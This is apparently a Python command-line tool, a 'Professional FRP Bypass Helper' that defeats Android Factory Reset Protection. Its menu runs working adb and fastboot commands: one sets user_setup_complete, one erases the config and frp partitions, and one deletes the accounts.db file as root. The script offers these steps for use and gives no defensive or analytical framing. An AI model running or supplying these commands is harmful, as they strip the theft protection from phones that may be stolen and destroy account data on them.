# CREATED BY: RAMIZ UDDIN
import os, time

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

# CREATED BY: RAMIZ UDDIN
import os
def run():
    while True:
        print("\033[1;32m[*] ", end=""); print("\n\033[1;33m[*] Professional FRP Bypass Helper\033[0m")
        print("\033[1;32m[*] ", end=""); print("1. Bypass via ADB (Global Method)")
        print("\033[1;32m[*] ", end=""); print("2. Bypass via Fastboot (Moto/MTK/SPD)")
        print("\033[1;32m[*] ", end=""); print("3. Remove Google Account (Root required)")
        print("\033[1;32m[*] ", end=""); print("99. Uninstall This Tool (Remove Packages)")
        print("\033[1;32m[*] ", end=""); print("0. Back to Main Menu")
        
        choice = input("\nFRP > ")
        if choice == '0': break
        
        print("\033[1;32m[*] ", end=""); print("[*] Waiting for device...")
        
        if choice == '1':
            os.system("adb wait-for-device")
            os.system("adb shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1")
            print("\033[1;32m[*] ", end=""); print("[+] ADB Bypass Command Sent.")
        elif choice == '2':
            os.system("fastboot wait-for-device")
            os.system("fastboot erase config && fastboot erase frp")
            print("\033[1;32m[*] ", end=""); print("[+] Fastboot Bypass Commands Sent.")
        elif choice == '3':
            os.system("adb shell su -c 'rm /data/system/users/0/accounts.db'")
            print("\033[1;32m[*] ", end=""); print("[+] Account Database Removal Attempted.")
            
        input("\n[Press Enter to Continue]")

if __name__ == "__main__":
    run()
